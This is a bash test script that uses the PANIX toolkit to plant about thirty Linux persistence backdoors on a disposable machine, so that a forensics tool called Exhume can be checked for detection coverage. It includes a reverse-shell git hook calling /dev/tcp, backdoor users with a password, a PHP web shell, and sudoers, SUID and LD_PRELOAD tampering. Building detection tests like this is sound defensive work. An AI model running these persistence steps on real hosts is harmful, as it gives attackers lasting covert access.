#!/usr/bin/env bash
# Plants Linux persistence with PANIX (https://github.com/Aegrah/PANIX, MIT) on a DISPOSABLE
# machine so the coverage job can check what Exhume reports. Never run this on a real host.
# Usage: [SKIP="id id"] panix.sh <panix-dir> <out-dir>
set -u
PANIX="$1"; OUT="$2"; mkdir -p "$OUT"
IP=10.10.10.10; PORT=1337
: > "$OUT/installed.tsv"
run() {
  local id="$1"; shift
  case " ${SKIP:-} " in *" $id "*) printf '%s\tskipped\n' "$id" >> "$OUT/installed.tsv"; return;; esac
  timeout 120 bash "$PANIX/panix.sh" "$@" < /dev/null > "$OUT/$id.log" 2>&1
  printf '%s\t%s\n' "$id" "$?" >> "$OUT/installed.tsv"
}
cd "$OUT"
mkdir -p /root/repo && git -C /root/repo init -q
useradd -m panixroot 2>/dev/null || true

run cron           --cron --default --ip $IP --port $PORT
run at             --at --default --ip $IP --port $PORT
run systemd        --systemd --default --ip $IP --port $PORT
run generator      --generator --ip $IP --port $PORT
run motd           --motd --default --ip $IP --port $PORT
run rc_local       --rc-local --default --ip $IP --port $PORT
run initd          --initd --default --ip $IP --port $PORT
run udev           --udev --default --ip $IP --port $PORT --systemd
run xdg            --xdg --default --ip $IP --port $PORT
run dbus           --dbus --default --ip $IP --port $PORT
run network_manager --network-manager --default --ip $IP --port $PORT
run polkit         --polkit
run git_pager      --git --default --ip $IP --port $PORT --pager
run git_hook       --git --custom --command "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' > /dev/null 2>&1 &) &" --path /root/repo/.git/hooks/pre-commit --hook
run shell_profile  --shell-profile --default --ip $IP --port $PORT
run authorized_keys --authorized-keys --default --key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICoverageTestKeyOnlyXXXXXXXXXXXXXXXXXXXXXXXX coverage@test"
run sudoers        --sudoers --username panixroot
run suid           --suid --default
run cap            --cap --default
run package_manager --package-manager --ip $IP --port $PORT --apt
run passwd_user    --passwd-user --default --username panixpw --password 'Passw0rd!'
run backdoor_user  --backdoor-user --username panixroot
run grub           --grub --default --ip $IP --port $PORT
run pam_exec       --pam --pam-exec --backdoor --ip $IP --port $PORT
run web_shell      --web-shell --port 8080 --language php --mechanism cmd
run system_binary  --system-binary --default --ip $IP --port $PORT
# Last: a global preload changes every later process (Exhume itself is static and unaffected).
run ld_preload     --ld-preload --ip $IP --port $PORT --binary /usr/bin/whoami
exit 0
